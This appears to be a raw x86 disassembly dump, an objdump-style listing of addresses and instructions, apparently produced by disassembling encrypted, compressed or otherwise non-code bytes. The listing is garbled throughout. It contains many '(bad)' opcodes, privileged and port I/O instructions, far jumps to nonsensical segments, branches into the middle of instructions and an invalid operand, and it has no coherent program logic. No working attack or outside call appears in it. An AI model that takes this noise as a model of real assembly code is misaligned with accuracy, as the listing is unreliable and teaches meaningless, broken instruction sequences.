  41abfa:	rcr    BYTE PTR [esi+esi*8],1
  41abfd:	jne    0x41ac24
  41abff:	imul   ebp,DWORD PTR [ebp+0x2d0a4a31],0x653d02e2
  41ac09:	push   0xd29b720c
  41ac0e:	adc    dh,bh
  41ac10:	outs   dx,BYTE PTR ds:[esi]
  41ac11:	shr    BYTE PTR [edi+0xdde28e8],1
  41ac17:	fisttp DWORD PTR [edx+0x61dc982c]
  41ac1d:	fst    DWORD PTR [eax+0x3748d879]
  41ac23:	cli    
  41ac24:	cwde   
  41ac25:	mov    ch,0xf5
  41ac27:	push   0x4a7a0fd4
  41ac2c:	push   ecx
  41ac2d:	outs   dx,DWORD PTR ds:[esi]
  41ac2e:	dec    edx
  41ac2f:	pop    ebx
  41ac30:	or     eax,0xe196911d
  41ac35:	mov    al,0x9
  41ac37:	pop    ss
  41ac38:	cmc    
  41ac39:	scas   al,BYTE PTR es:[edi]
  41ac3a:	mov    ebx,ss
  41ac3c:	mov    eax,ds:0x1735c8e7
  41ac41:	imul   eax,DWORD PTR [edi-0x484f87b6],0x9064b3b5
  41ac4b:	xor    al,0xf5
  41ac4d:	sti    
  41ac4e:	loop   0x41abeb
  41ac50:	push   ebp
  41ac51:	adc    DWORD PTR [eax-0x63519db6],eax
  41ac57:	into   
  41ac58:	mov    ds:0x9b720163,eax
  41ac5d:	jmp    0x41ac23
  41ac5f:	mov    al,ds:0xebc784a2
  41ac64:	pop    esi
  41ac65:	ficomp WORD PTR [edx]
  41ac67:	push   ebp
  41ac68:	out    0xc8,eax
  41ac6a:	inc    edi
  41ac6b:	cmp    edx,DWORD PTR [ebx+0x2e02cb5d]
  41ac71:	fiadd  WORD PTR [eax]
  41ac73:	push   0x33eb4a7a
  41ac78:	data16 add al,0x31
  41ac7b:	(bad)  
  41ac7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac7d:	(bad)  [edi+ebx*8+0x526b1cbd]
  41ac84:	fwait
  41ac85:	or     al,0x59
  41ac87:	dec    ebx
  41ac88:	ins    DWORD PTR es:[edi],dx
  41ac89:	jle    0x41ac53
  41ac8b:	xor    al,0x4f
  41ac8d:	cld    
  41ac8e:	cmp    eax,0xf19e7d6b
  41ac93:	ret    
  41ac94:	mov    eax,ds:0x9bda1e85
  41ac99:	in     eax,0x26
  41ac9b:	mov    ecx,0x49641911
  41aca0:	xchg   edx,eax
  41aca1:	enter  0x7a70,0x22
  41aca5:	test   ah,ah
  41aca7:	inc    esp
  41aca8:	sti    
  41aca9:	pop    esp
  41acaa:	nop
  41acab:	sbb    BYTE PTR [esi+0x9188108],bh
  41acb1:	fwait
  41acb2:	test   DWORD PTR [ecx+0x33],0xc77abe48
  41acb9:	sub    ch,ah
  41acbb:	mov    ebp,0x1c906a0e
  41acc0:	sbb    edi,esp
  41acc2:	xor    eax,0x9ad57113
  41acc7:	dec    ecx
  41acc8:	cdq    
  41acc9:	xchg   ebx,eax
  41acca:	repnz cs mov bl,0xa5
  41acce:	cmp    ecx,ebx
  41acd0:	mov    ds:0x484bd321,al
  41acd5:	push   cs
  41acd6:	xor    BYTE PTR [esi-0x75],bh
  41acd9:	out    0xa,eax
  41acdb:	push   ecx
  41acdc:	pop    esi
  41acdd:	sub    ecx,DWORD PTR [ecx]
  41acdf:	idiv   BYTE PTR [edx-0x5d1f9543]
  41ace5:	ds sahf 
  41ace7:	mov    cl,0x6d
  41ace9:	clc    
  41acea:	add    BYTE PTR [edx+0x7f68082f],cl
  41acf0:	fisttp WORD PTR [esi+0x53]
  41acf3:	dec    edx
  41acf4:	loope  0x41ac7d
  41acf6:	dec    edx
  41acf7:	mov    esp,0x385cfd12
  41acfc:	fwait
  41acfd:	mov    edx,0x5eea446b
  41ad02:	out    dx,al
  41ad03:	ds adc ebx,esi
  41ad06:	scas   eax,DWORD PTR es:[edi]
  41ad07:	cmp    dh,BYTE PTR [edi+ecx*2]
  41ad0a:	inc    eax
  41ad0b:	cmp    esp,DWORD PTR es:0x579b4d01
  41ad12:	mov    dl,0xb2
  41ad14:	mov    DWORD PTR [esi-0x67],esi
  41ad17:	fcomp  st(1)
  41ad19:	(bad)  [ecx+esi*4-0x8934914]
  41ad20:	push   esi
  41ad21:	dec    esi
  41ad22:	lock repz cmp DWORD PTR [eax-0x31efc6f8],0x1c
  41ad2b:	dec    ebx
  41ad2c:	jp     0x41ad34
  41ad2e:	mov    DWORD PTR [esi-0x3f],0x3015fae1
  41ad35:	(bad)  
  41ad37:	cwde   
  41ad38:	mov    esi,ds
  41ad3a:	out    0xcb,eax
  41ad3c:	ja     0x41ad32
  41ad3e:	or     edx,ecx
  41ad40:	(bad)  
  41ad41:	frstor [esi]
  41ad43:	sub    BYTE PTR [eax-0x634e662d],bl
  41ad49:	dec    eax
  41ad4a:	xchg   ecx,eax
  41ad4b:	in     al,0x26
  41ad4d:	xor    dl,ah
  41ad4f:	mov    ebp,DWORD PTR [ebp-0x74648f13]
  41ad55:	adc    BYTE PTR [edx],0x4b
  41ad58:	dec    edx
  41ad59:	pop    ds
  41ad5a:	dec    edi
  41ad5b:	scas   al,BYTE PTR es:[edi]
  41ad5c:	cdq    
  41ad5d:	xlat   BYTE PTR ds:[ebx]
  41ad5e:	xchg   ebp,eax
  41ad5f:	and    eax,0xc90301b
  41ad64:	push   ds
  41ad65:	leave  
  41ad66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad67:	pop    es
  41ad68:	iret   
  41ad69:	(bad)  
  41ad6a:	lahf   
  41ad6b:	xor    DWORD PTR [edi+0x3b562edd],ebp
  41ad71:	fisttp DWORD PTR ds:0x900721ee
  41ad77:	xchg   esp,eax
  41ad78:	ret    
  41ad79:	cmp    DWORD PTR [ebx-0x70],ecx
  41ad7c:	enter  0x7f3f,0x4a
  41ad80:	mov    ebp,0xd68e5f4a
  41ad85:	push   0xffffffca
  41ad87:	push   eax
  41ad88:	dec    ebx
  41ad89:	pop    ss
  41ad8a:	nop
  41ad8b:	mov    al,ds:0x33f91b3a
  41ad90:	inc    edx
  41ad91:	inc    DWORD PTR [esi+0x24056159]
  41ad97:	(bad)  
  41ad98:	fisttp DWORD PTR [ebx+0x5e6ab0a6]
  41ad9e:	sub    ch,0x9b
  41ada1:	xchg   ebp,eax
  41ada2:	jl     0x41ae03
  41ada4:	shr    DWORD PTR ds:0xe71a5797,1
  41adaa:	retf   0x2daf
  41adad:	daa    
  41adae:	nop
  41adaf:	rol    BYTE PTR [edi+eiz*4],cl
  41adb2:	or     al,0x89
  41adb4:	sahf   
  41adb5:	pop    eax
  41adb6:	mov    ah,0x3c
  41adb8:	xor    BYTE PTR [edx-0x33d8b5fc],ch
  41adbe:	outs   dx,BYTE PTR ds:[esi]
  41adbf:	push   0x50916873
  41adc4:	xchg   edi,eax
  41adc5:	les    edx,FWORD PTR [eax+0xd8b74a7]
  41adcb:	or     DWORD PTR [eax+0x5f49d6b5],edx
  41add1:	out    0xeb,eax
  41add3:	xchg   esi,eax
  41add4:	aas    
  41add5:	inc    ecx
  41add6:	xor    ecx,ebp
  41add8:	fwait
  41add9:	mov    ebx,0x1a461537
  41adde:	push   edx
  41addf:	in     al,0x4
  41ade1:	cli    
  41ade2:	sub    ebx,DWORD PTR [edx+0x1af5de99]
  41ade8:	pop    eax
  41ade9:	out    0xab,eax
  41adeb:	inc    esp
  41adec:	fwait
  41aded:	xchg   esp,eax
  41adee:	or     ch,BYTE PTR [esi+0x6d]
  41adf1:	sbb    esi,DWORD PTR [ecx]
  41adf3:	and    al,0x62
  41adf5:	fidivr WORD PTR [edx-0x3d]
  41adf8:	sti    
  41adf9:	(bad)  
  41adfb:	loope  0x41ad9e
  41adfd:	push   0x61842091
  41ae02:	das    
  41ae03:	lea    ecx,[esi]
  41ae05:	mov    ebx,0xde8d2050
  41ae0a:	adc    ch,bh
  41ae0c:	push   es
  41ae0d:	mov    ds:0x9a130995,al
  41ae12:	sar    bl,0xc1
  41ae15:	adc    ebx,DWORD PTR [eax-0x7e]
  41ae18:	push   ebp
  41ae19:	faddp  st(5),st
  41ae1b:	(bad)  
  41ae1c:	or     BYTE PTR [esi+0x3],dh
  41ae1f:	or     BYTE PTR [ebx+0x10],bh
  41ae22:	lods   al,BYTE PTR ds:[esi]
  41ae23:	ret    
  41ae24:	ins    BYTE PTR es:[edi],dx
  41ae25:	mov    al,ds:0xbb9b4cf4
  41ae2a:	mov    dh,0x20
  41ae2c:	(bad)  
  41ae2d:	dec    ecx
  41ae2e:	idiv   BYTE PTR [ebp-0x5a842244]
  41ae34:	(bad)  [ebx-0x4c]
  41ae37:	jl     0x41ae8e
  41ae39:	inc    edx
  41ae3a:	nop
  41ae3b:	mov    al,0x79
  41ae3d:	jne    0x41adda
  41ae3f:	fs pop esi
  41ae41:	or     eax,0x55034a8a
  41ae46:	add    ch,ah
  41ae48:	loope  0x41ae35
  41ae4a:	cmp    dl,0x9b
  41ae4d:	add    al,0xed
  41ae4f:	lds    esi,FWORD PTR [eax+0x7dd1db6a]
  41ae55:	fimul  WORD PTR [edx-0x58e9c699]
  41ae5b:	sub    DWORD PTR [edx+0x3e89901e],0xffffffd7
  41ae62:	fimul  WORD PTR [edx-0x44]
  41ae65:	call   0xde4f6cba
  41ae6a:	imul   esp,DWORD PTR [eax+edx*1-0x41],0xce598b57
  41ae72:	sahf   
  41ae73:	xchg   ebp,eax
  41ae74:	cmc    
  41ae75:	mov    al,0xee
  41ae77:	test   eax,0x54984b3c
  41ae7c:	loope  0x41ae43
  41ae7e:	aad    0x49
  41ae80:	inc    eax
  41ae81:	adc    BYTE PTR [esi-0x3f],ch
  41ae84:	mov    ebp,DWORD PTR ds:0x64b9dd19
  41ae8a:	popf   
  41ae8b:	adc    DWORD PTR ds:0x3201ccde,edx
  41ae91:	add    bh,bl
  41ae93:	inc    eax
  41ae94:	inc    ebp
  41ae95:	fdivp  st(1),st
  41ae97:	push   esp
  41ae98:	fcmovnb st,st(7)
  41ae9a:	cmp    bl,ah
  41ae9c:	pop    ebp
  41ae9d:	or     BYTE PTR [eax+0x75249aad],dl
  41aea3:	add    eax,0x85ac8bbb
  41aea8:	inc    ecx
  41aea9:	cld    
  41aeaa:	(bad)  
  41aeab:	fidiv  DWORD PTR [ebp+0xf]
  41aeaf:	call   0xfbd1c8a3
  41aeb4:	sbb    eax,0xce90ee0a
  41aeb9:	xchg   esp,eax
  41aeba:	gs dec edx
  41aebc:	dec    ecx
  41aebd:	sub    BYTE PTR [edx+0x6a66cc08],ah
  41aec3:	or     al,0x9b
  41aec5:	rcl    dh,1
  41aec7:	cmp    eax,0x67790604
  41aecc:	aaa    
  41aecd:	fiadd  WORD PTR [esp+eax*1-0x3ebe411b]
  41aed4:	sub    BYTE PTR [ebp+0x2c6b6a90],0x70
  41aedb:	sbb    esi,DWORD PTR [edx]
  41aedd:	push   esi
  41aede:	arpl   WORD PTR [edx-0x62],cx
  41aee1:	xlat   BYTE PTR ds:[ebx]
  41aee2:	mov    WORD PTR [eax+edx*2],gs
  41aee5:	fcomp  QWORD PTR [edx-0x6f747ebf]
  41aeeb:	push   ss
  41aeec:	je     0x41ae98
  41aeee:	rcr    DWORD PTR [ecx-0xd],cl
  41aef1:	popf   
  41aef2:	aad    0x3b
  41aef4:	xor    eax,0xa0d740ed
  41aef9:	dec    esp
  41aefa:	xchg   edi,eax
  41aefb:	bound  eax,QWORD PTR [ebx-0x45fbbae2]
  41af01:	push   ecx
  41af02:	lahf   
  41af03:	das    
  41af04:	cmc    
  41af05:	sub    al,0x8f
  41af07:	retf   0x728a
  41af0a:	cmp    eax,esp
  41af0c:	in     eax,dx
  41af0d:	fisttp QWORD PTR [esi+edx*2+0x61]
  41af11:	push   esi
  41af12:	into   
  41af13:	xor    al,BYTE PTR [eax-0x64b1d7b6]
  41af19:	xor    BYTE PTR [ebp+ebx*1-0x3b],dl
  41af1d:	mov    ecx,0xcee1c503
  41af22:	(bad)  
  41af23:	(bad)  
  41af24:	xchg   DWORD PTR [edx+0xa],eax
  41af27:	dec    edx
  41af28:	mov    ah,BYTE PTR [eax+0x18]
  41af2b:	daa    
  41af2c:	neg    dl
  41af2e:	xchg   edx,eax
  41af2f:	sahf   
  41af30:	mov    al,ds:0x882fe409
  41af35:	ret    0x1e53
  41af38:	cmp    eax,0x1fd020be
  41af3d:	(bad)  
  41af3f:	inc    ecx
  41af40:	add    DWORD PTR [edx+eax*8-0x48],edi
  41af44:	cmp    BYTE PTR [ecx-0x69d7685a],dl
  41af4a:	dec    eax
  41af4b:	test   BYTE PTR [ebx+0xe0c8bb1],bl
  41af51:	dec    eax
  41af52:	adc    al,0x62
  41af54:	fwait
  41af55:	mov    esi,0xdfa6527
  41af5a:	das    
  41af5b:	jg     0x41af64
  41af5d:	fisub  WORD PTR [ecx+0x359c73a9]
  41af63:	clc    
  41af64:	cmp    esp,DWORD PTR [edi-0x70]
  41af67:	std    
  41af68:	and    dl,BYTE PTR [edi+0x75]
  41af6b:	jl     0x41af6b
  41af6d:	adc    bh,BYTE PTR [ebp-0x5264eab7]
  41af73:	dec    eax
  41af74:	test   DWORD PTR [esi-0x1964e9e0],ecx
  41af7a:	scas   al,BYTE PTR es:[edi]
  41af7b:	fcmovu st,st(4)
  41af7d:	dec    ebx
  41af7e:	xchg   BYTE PTR [edx-0x1d46221d],ch
  41af84:	test   bh,dl
  41af86:	push   0x2a
  41af88:	sub    ebx,DWORD PTR [ebp-0x6de43e70]
  41af8e:	std    
  41af8f:	xor    BYTE PTR [ecx],cl
  41af91:	add    DWORD PTR [ecx],eax
  41af93:	cs and eax,0x783667de
  41af99:	ds cli 
  41af9b:	or     al,0xc8
  41af9d:	xchg   BYTE PTR [eax-0x7ec31a3b],dl
  41afa3:	leave  
  41afa4:	dec    esi
  41afa5:	ret    0x4a56
  41afa8:	push   esp
  41afa9:	pop    ecx
  41afaa:	xor    eax,ebx
  41afac:	jecxz  0x41afce
  41afae:	ret    0x9bdd
  41afb1:	jg     0x41afb1
  41afb3:	dec    eax
  41afb4:	pop    ss
  41afb5:	clc    
  41afb6:	xchg   esi,eax
  41afb7:	mov    al,0xdc
  41afb9:	pop    esp
  41afba:	adc    DWORD PTR [edx-0x7d],ecx
  41afbd:	push   esi
  41afbe:	lods   al,BYTE PTR ds:[esi]
  41afbf:	inc    edi
  41afc0:	add    BYTE PTR [ecx+0xd],dl
  41afc3:	daa    
  41afc4:	fwait
  41afc5:	adc    eax,0x326eb89f
  41afca:	add    DWORD PTR [ebx+0x3d9ce79d],esi
  41afd0:	push   esp
  41afd1:	push   edi
  41afd2:	jae    0x41b01e
  41afd4:	cmp    dh,bh
  41afd6:	or     al,0x6d
  41afd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afd9:	adc    al,0x90
  41afdb:	or     BYTE PTR [esi],ah
  41afdd:	test   BYTE PTR [edx+0x72],0xcf
  41afe1:	and    BYTE PTR [esi-0x20a423c3],ah
  41afe7:	aas    
  41afe8:	adc    eax,0x77faf8de
  41afed:	(bad)  
  41afee:	enter  0x7b2b,0x5c
  41aff2:	nop
  41aff3:	in     al,dx
  41aff4:	jne    0x41af79
  41aff6:	mov    ah,0x14
  41aff8:	push   esp
  41aff9:	arpl   WORD PTR ds:0xcaddd602,ax
  41afff:	sbb    edi,esp
  41b001:	xchg   ebp,eax
  41b002:	mov    edi,0x906d360b
  41b007:	add    esi,DWORD PTR [eax-0x2c]
  41b00a:	(bad)
  41b00d:	sar    ebx,0x49
  41b010:	test   eax,0xeb375e8c
  41b015:	dec    esi
  41b016:	adc    eax,0x96469bb7
  41b01b:	mov    ds:0xc4effdf5,al
  41b020:	mov    ch,0x35
  41b022:	fist   WORD PTR [edi]
  41b024:	fwait
  41b025:	int    0x9f
  41b027:	dec    eax
  41b028:	popf   
  41b029:	jle    0x41b07a
  41b02b:	xor    DWORD PTR [edi+esi*4-0x6844e7e0],ebx
  41b032:	inc    eax
  41b033:	xchg   ecx,eax
  41b034:	jnp    0x41afbd
  41b036:	xor    al,0x4a
  41b038:	mov    ds:0xc905fc1b,al
  41b03d:	lds    ebp,FWORD PTR [esi+edx*1]
  41b040:	mov    eax,DWORD PTR [ebx-0x69]
  41b043:	pop    ecx
  41b044:	arpl   WORD PTR [eax+0x64dbf853],bx
  41b04a:	sub    edi,DWORD PTR [ecx+0x249bddc3]
  41b050:	add    cl,0xb3
  41b053:	pop    ebx
  41b054:	push   ss
  41b055:	cmp    DWORD PTR [eax-0x30fd5b59],edx
  41b05b:	sbb    eax,0x91a732a0
  41b060:	xor    dl,ah
  41b062:	nop
  41b063:	sbb    DWORD PTR [esi],esi
  41b065:	adc    ebx,edi
  41b067:	sub    BYTE PTR [esi+esi*8-0x6a],al
  41b06b:	addr16 enter 0xeff7,0xac
  41b070:	imul   esi,DWORD PTR [ecx-0x21dfd7cf],0x2a
  41b077:	jo     0x41b057
  41b079:	sahf   
  41b07a:	adc    bl,bl
  41b07c:	pop    edi
  41b07d:	dec    edx
  41b07e:	nop
  41b07f:	fisttp WORD PTR [edi+edi*8-0x4229df1f]
  41b086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b087:	enter  0xfafe,0xc3
  41b08b:	ret    
  41b08c:	lds    ebx,FWORD PTR [ebp+0x74]
  41b08f:	pop    esi
  41b090:	mov    ds:0xfc30702,eax
  41b095:	repz retf 0x720a
  41b099:	sbb    eax,0x5dbf8192
  41b09e:	sbb    eax,0x62a43f4
  41b0a3:	add    al,0xe4
  41b0a5:	cmc    
  41b0a6:	adc    al,0x36
  41b0a8:	je     0x41b038
  41b0aa:	adc    BYTE PTR [eax],ch
  41b0ac:	xchg   DWORD PTR [eax-0x70],ebp
  41b0af:	or     dl,al
  41b0b1:	loope  0x41b064
  41b0b3:	xchg   ecx,eax
  41b0b4:	dec    BYTE PTR [eax+0x692b4db0]
  41b0ba:	mov    fs,ebp
  41b0bc:	(bad)  
  41b0bd:	pop    ebp
  41b0be:	(bad)  
  41b0c0:	fsub   DWORD PTR [esi]
  41b0c2:	nop
  41b0c3:	cdq    
  41b0c4:	adc    edi,esp
  41b0c6:	mov    dl,0xff
  41b0c8:	call   0x87ed:0xa94bc916
  41b0cf:	data16 add al,0xa
  41b0d2:	lock fstp DWORD PTR [ecx]
  41b0d5:	dec    BYTE PTR [edi+0x527d3592]
  41b0db:	sub    ecx,esp
  41b0dd:	sbb    al,0x6d
  41b0df:	inc    esp
  41b0e0:	cmp    esi,ebx
  41b0e2:	popf   
  41b0e3:	dec    esi
  41b0e4:	out    dx,eax
  41b0e5:	dec    edx
  41b0e6:	pusha  
  41b0e7:	(bad)  
  41b0e8:	xchg   esi,eax
  41b0e9:	mov    esi,0xa2996690
  41b0ee:	xor    edi,DWORD PTR [edi]
  41b0f0:	mov    al,0x7d
  41b0f2:	or     ch,BYTE PTR [ecx+0x1e]
  41b0f5:	cld    
  41b0f6:	(bad)  
  41b0f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0f8:	push   cs
  41b0f9:	push   ds
  41b0fa:	adc    eax,0x823291ac
  41b0ff:	push   cs
  41b100:	fwait
  41b101:	jbe    0x41b141
  41b103:	and    DWORD PTR [edi+ebx*4],0x69
  41b107:	ficom  DWORD PTR [ebx]
  41b109:	fmulp  st(2),st
  41b10b:	les    edi,FWORD PTR [esi+0x7c]
  41b10e:	shl    DWORD PTR [eax],1
  41b110:	(bad)
  41b113:	mov    ?,WORD PTR [ebx]
  41b115:	mov    bl,0x3c
  41b117:	adc    bh,al
  41b119:	rcr    dl,cl
  41b11b:	dec    ecx
  41b11c:	je     0x41b0b6
  41b11e:	and    al,0x42
  41b120:	jae    0x41b112
  41b122:	shl    ch,cl
  41b124:	fwait
  41b125:	ins    DWORD PTR es:[edi],dx
  41b126:	xchg   ebp,eax
  41b127:	(bad)  
  41b128:	mov    esi,0xdd471270
  41b12d:	fisttp QWORD PTR [ebx]
  41b12f:	xor    eax,0xa9389da7
  41b134:	aad    0xc4
  41b136:	nop
  41b137:	pop    eax
  41b138:	dec    ebx
  41b139:	adc    BYTE PTR [edi+0x55],dl
  41b13c:	xor    ecx,DWORD PTR [ecx+0x27]
  41b13f:	pop    ecx
  41b140:	mov    cl,0x10
  41b142:	xchg   ebx,eax
  41b143:	in     eax,dx
  41b144:	jnp    0x41b0ed
  41b146:	and    esi,DWORD PTR [edi+0x45]
  41b149:	add    dl,BYTE PTR [eax-0x2778fa5b]
  41b14f:	dec    eax
  41b150:	sar    ah,1
  41b152:	sub    ebp,DWORD PTR [ecx+0x6]
  41b155:	xchg   ebx,eax
  41b156:	call   0x9b72:0x1ef7fb79
  41b15d:	mov    ebx,0x41982c55
  41b162:	aas    
  41b163:	ja     0x41b10f
  41b165:	frstor [ebp-0x62522764]
  41b16b:	or     esp,DWORD PTR [edi+0x2]
  41b16e:	lods   eax,DWORD PTR ds:[esi]
  41b16f:	mov    ds:0x49c83587,al
  41b174:	in     eax,dx
  41b175:	sub    eax,edi
  41b177:	mov    bl,0x73
  41b179:	xchg   edx,eax
  41b17a:	mov    edi,0xa6199fc8
  41b17f:	xchg   edi,eax
  41b180:	jecxz  0x41b196
  41b182:	nop
  41b183:	mov    ebp,0x7af5685c
  41b188:	test   BYTE PTR [esi+ebx*4+0x5b9de7df],cl
  41b18f:	jmp    0x5355:0x1b2033cf
  41b196:	push   edi
  41b197:	push   ecx
  41b198:	or     BYTE PTR [ecx-0x4a],ah
  41b19b:	aad    0x25
  41b19d:	dec    esi
  41b19e:	mov    ds:0x1997cbd,eax
  41b1a3:	lea    esp,[edx+esi*2+0x5e113542]
  41b1aa:	stos   BYTE PTR es:[edi],al
  41b1ab:	sar    DWORD PTR [ebx+0x494996ca],1
  41b1b1:	mov    BYTE PTR [esi-0x7cc72517],bl
  41b1b7:	setnp  BYTE PTR [esi-0x57a01816]
  41b1be:	mov    eax,DWORD PTR [ecx-0x42]
  41b1c1:	push   ss
  41b1c2:	mov    dl,0xd8
  41b1c4:	push   ebp
  41b1c5:	leave  
  41b1c6:	dec    esp
  41b1c7:	int3   
  41b1c8:	sbb    ebx,esp
  41b1ca:	mov    al,ds:0xdf17613b
  41b1cf:	mov    ebx,DWORD PTR [ebx+0x6543fc70]
  41b1d5:	fistp  DWORD PTR [eax-0x401adcb1]
  41b1db:	jecxz  0x41b250
  41b1dd:	bound  edx,QWORD PTR [ecx-0x7f]
  41b1e0:	jb     0x41b170
  41b1e2:	test   eax,0xa202de02
  41b1e7:	and    esp,DWORD PTR [ebp-0x68a47014]
  41b1ed:	pop    esp
  41b1ee:	movsx  ecx,bh
  41b1f1:	fmulp  st(7),st
  41b1f3:	mov    BYTE PTR [ecx+0x48],ch
  41b1f6:	mov    edi,DWORD PTR ds:0x210c616
  41b1fc:	mov    ecx,DWORD PTR [edx-0x70]
  41b1ff:	data16 jo 0x41b1d9
  41b202:	popf   
  41b203:	and    bl,al
  41b205:	pushf  
  41b206:	out    dx,al
  41b207:	dec    ecx
  41b208:	cmp    edi,DWORD PTR [ecx-0x7af5d2c6]
  41b20e:	ficom  WORD PTR [esi-0x7da11909]
  41b214:	adc    ebx,esi
  41b216:	jmp    0x5a7105d2
  41b21b:	dec    ebx
  41b21c:	popa   
  41b21d:	in     eax,dx
  41b21e:	inc    esi
  41b21f:	mov    esi,0xe3d04da5
  41b224:	dec    ecx
  41b225:	ds xor eax,0x7f599bea
  41b22b:	fdivr  QWORD PTR [edx+0x200c28a2]
  41b231:	fisttp WORD PTR [edi]
  41b233:	add    al,0xb9
  41b235:	clc    
  41b236:	mov    dh,0xff
  41b238:	mov    esp,0xa265e7d5
  41b23d:	test   BYTE PTR [ebp+0x602e36d5],cl
  41b243:	in     al,dx
  41b244:	aas    
  41b245:	psubb  mm6,QWORD PTR [ecx]
  41b248:	popa   
  41b249:	push   ss
  41b24a:	int3   
  41b24b:	sahf   
  41b24c:	fwait
  41b24d:	loope  0x41b27e
  41b24f:	pop    edx
  41b250:	shl    BYTE PTR [ebp+0x21810091],1
  41b256:	nop
  41b257:	add    DWORD PTR [edx],edx
  41b259:	scas   eax,DWORD PTR es:[edi]
  41b25a:	imul   edx,DWORD PTR [ecx],0x4d7172d5
  41b260:	shr    DWORD PTR [ebp-0x7],0x2b
  41b264:	pop    ds
  41b265:	adc    eax,0x9cf00a6d
  41b26a:	popa   
  41b26b:	ja     0x41b208
  41b26d:	jp     0x41b20c
  41b26f:	mov    ebx,0x3284191
  41b274:	or     ch,dh
  41b276:	jno    0x41b2d6
  41b278:	call   0x418ce95a
  41b27d:	push   ebx
  41b27e:	mov    ch,0xfc
  41b280:	fwait
  41b281:	and    dh,BYTE PTR [eax-0x2d]
  41b284:	dec    ecx
  41b285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b286:	les    ebx,FWORD PTR [ebx]
  41b288:	push   ds
  41b289:	fbld   TBYTE PTR [ecx]
  41b28b:	jo     0x41b2c5
  41b28d:	xor    al,0x48
  41b28f:	jecxz  0x41b242
  41b291:	test   eax,0xa49c3d1d
  41b296:	jmp    0xfb7f:0x1bd5190e
  41b29d:	xor    DWORD PTR [ebp-0x68223ed3],esp
  41b2a3:	idiv   BYTE PTR [esi+0x1b]
  41b2a6:	add    eax,0x97b1d131
  41b2ab:	shl    DWORD PTR [ebp+0x1ac5d1b0],1
  41b2b1:	jle    0x41b2d2
  41b2b3:	(bad)  [eax+0x54]
  41b2b6:	retf   
  41b2b7:	dec    ecx
  41b2b8:	imul   eax,DWORD PTR [edx],0xffffffbb
  41b2bb:	repnz mov al,0xc
  41b2be:	adc    al,0xcc
  41b2c0:	fwait
  41b2c1:	sbb    eax,0xc037c13
  41b2c6:	xchg   ecx,edi
  41b2c8:	aad    0xdd
  41b2ca:	sub    BYTE PTR [esp+edx*2-0x745b936b],cl
  41b2d1:	push   esi
  41b2d2:	nop
  41b2d3:	jae    0x41b26a
  41b2d5:	int3   
  41b2d6:	push   esi
  41b2d7:	xor    al,0x24
  41b2d9:	jmp    0x41b313
  41b2db:	and    eax,0x6f
  41b2de:	or     al,0x72
  41b2e0:	fsubp  st(6),st
  41b2e2:	cmp    DWORD PTR [eax-0x8],eax
  41b2e5:	fstp   st(5)
  41b2e7:	call   0xc4d9:0x2eeb15b8
  41b2ee:	xchg   ebp,eax
  41b2ef:	(bad)  
  41b2f0:	pushf  
  41b2f1:	xchg   ebx,eax
  41b2f2:	push   0xfffffffc
  41b2f4:	pop    esi
  41b2f5:	dec    ebp
  41b2f6:	(bad)  
  41b2f7:	adc    DWORD PTR ds:0xcfc95a02,eax
  41b2fd:	fnstsw WORD PTR [esi-0x1b427ccd]
  41b303:	stc    
  41b304:	dec    esp
  41b305:	or     edx,DWORD PTR [eax+0x1c3f501f]
  41b30b:	rdmsr  
  41b30d:	push   esp
  41b30e:	jle    0x41b35a
  41b310:	mov    edx,0xb05de8ed
  41b315:	jmp    0xc55a:0x5d9bc745
  41b31c:	push   ebp
  41b31d:	inc    ebp
  41b31e:	pop    ebp
  41b31f:	pop    esp
  41b320:	jmp    0x41b2eb
  41b322:	aaa    
  41b323:	dec    esp
  41b324:	mov    ds:0x5835ca74,eax
  41b329:	sub    al,0x70
  41b32b:	push   DWORD PTR [eax-0xb1d6fc7]
  41b331:	sbb    DWORD PTR [ebx-0x462e915f],edi
  41b337:	push   0xa8993a1
  41b33c:	fsubr  st(2),st
  41b33e:	push   DWORD PTR [ecx]
  41b340:	push   0x487a9086
  41b345:	repnz in eax,0xe8
  41b348:	addr16 jae 0x41b2f9
  41b34b:	fst    DWORD PTR [ebx]
  41b34d:	dec    esi
  41b34e:	dec    ecx
  41b34f:	dec    ebx
  41b350:	je     0x41b376
  41b352:	adc    al,al
  41b354:	fxch   st(0)
  41b356:	rol    DWORD PTR [ebp-0x16],cl
  41b359:	mov    al,0x90
  41b35b:	test   esp,ebp
  41b35d:	sub    DWORD PTR [edi-0x43],edx
  41b360:	push   0x8151146d
  41b365:	fs add al,0xcc
  41b368:	dec    ecx
  41b369:	cs pop edx
  41b36b:	fistp  QWORD PTR ds:0xbd4a97af
  41b371:	pop    eax
  41b372:	jo     0x41b39a
  41b374:	dec    ebx
  41b375:	test   BYTE PTR [ecx+0x109acfd0],bl
  41b37b:	icebp  
  41b37c:	pop    edi
  41b37d:	bound  edi,QWORD PTR [ebp+0x32ed9b21]
  41b383:	shl    DWORD PTR [ecx-0x2e],0x10
  41b387:	repz out 0xde,eax
  41b38a:	fs pop ss
  41b38c:	dec    ebp
  41b38d:	mov    ch,0xfa
  41b38f:	data16 in al,0xa9
  41b392:	mov    edx,0x11249b2f
  41b397:	add    edx,DWORD PTR [edx+0x7ca500e7]
  41b39d:	fimul  WORD PTR [eax]
  41b39f:	mov    al,0xa
  41b3a1:	and    ebx,DWORD PTR [edi+0x2f]
  41b3a4:	(bad)  
  41b3a5:	mov    edx,DWORD PTR [eax+0x3bb76348]
  41b3ab:	sti    
  41b3ac:	fimul  WORD PTR [edi-0x57]
  41b3af:	dec    ecx
  41b3b0:	push   eax
  41b3b1:	in     eax,0x92
  41b3b3:	daa    
  41b3b4:	fnstsw WORD PTR [esi+0x10]
  41b3b7:	hlt    
  41b3b8:	fwait
  41b3b9:	enter  0xefb0,0x3
  41b3bd:	cwde   
  41b3be:	retf   0x741f
  41b3c1:	sbb    ch,bh
  41b3c3:	sub    BYTE PTR [ebx+0x4aedff7d],bl
  41b3c9:	inc    edx
  41b3ca:	arpl   bx,dx
  41b3cc:	jmp    0x41b37b
  41b3ce:	pop    eax
  41b3cf:	mov    edi,0xc4852f9b
  41b3d4:	inc    esp
  41b3d5:	ins    DWORD PTR es:[edi],dx
  41b3d6:	sbb    dh,al
  41b3d8:	aaa    
